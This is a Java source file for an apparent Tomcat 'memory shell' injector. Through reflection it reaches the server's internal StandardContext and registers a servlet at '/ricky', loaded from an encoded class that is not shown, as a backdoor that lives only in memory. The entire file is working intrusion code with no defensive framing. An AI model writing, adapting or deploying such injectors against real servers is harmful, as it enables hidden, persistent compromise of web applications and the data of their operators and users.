package com.tomcat.memshell.Servlet;

import com.tomcat.util.ClassUtil;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletMapping;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;

public class MemServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try{
            String urlPattern = "/ricky";
            String servletName = "ricky";
            ServletContext servletContext = req.getSession().getServletContext();
            if(servletContext.getFilterRegistration(servletName) == null) {
                Field servletfield = servletContext.getClass().getDeclaredField("context");
                servletfield.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) servletfield.get(servletContext);
                Field contextfield = applicationContext.getClass().getDeclaredField("context");
                contextfield.setAccessible(true);
                StandardContext standardContext = (StandardContext) contextfield.get(applicationContext);

                Class<?> classServlet = ClassUtil.getClass(ClassUtil.SERVLET_STRING);

                Wrapper wrapper = standardContext.createWrapper();
                // 设置为1才会将Servlet添加至容器
                wrapper.setLoadOnStartup(1);
                wrapper.setName(servletName);
                wrapper.setServlet((Servlet) classServlet.newInstance());
                wrapper.setServletClass(classServlet.getName());
                standardContext.addChild(wrapper);

                standardContext.addServletMapping(urlPattern, servletName);
                PrintWriter writer = resp.getWriter();
                writer.println("tomcat servlet added");
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
